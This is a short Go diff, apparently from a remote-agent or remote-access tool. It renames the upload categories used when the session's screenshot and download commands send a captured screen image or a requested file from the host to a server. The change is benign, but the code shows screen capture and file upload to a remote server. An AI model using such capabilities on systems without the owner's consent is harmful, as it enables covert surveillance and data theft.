@@ -72,7 +72,7 @@ func cmdScreenshot(s *Session, _ []string) (int, string) {
 	}
 	defer func() { _ = os.Remove(filePath) }()
 
-	return s.uploadSingleFileToServerResult(filePath, "screenshot")
+	return s.uploadSingleFileToServerResult(filePath, "screenshots")
 }
 
 func cmdDownload(s *Session, args []string) (int, string) {
@@ -98,7 +98,7 @@ func cmdDownload(s *Session, args []string) (int, string) {
 		return 0, "Download failed: target is a directory"
 	}
 
-	return s.uploadSingleFileToServerResult(target, "download")
+	return s.uploadSingleFileToServerResult(target, "downloads")
 }
 
 func captureScreenshotToTemp(workDir string) (string, error) {
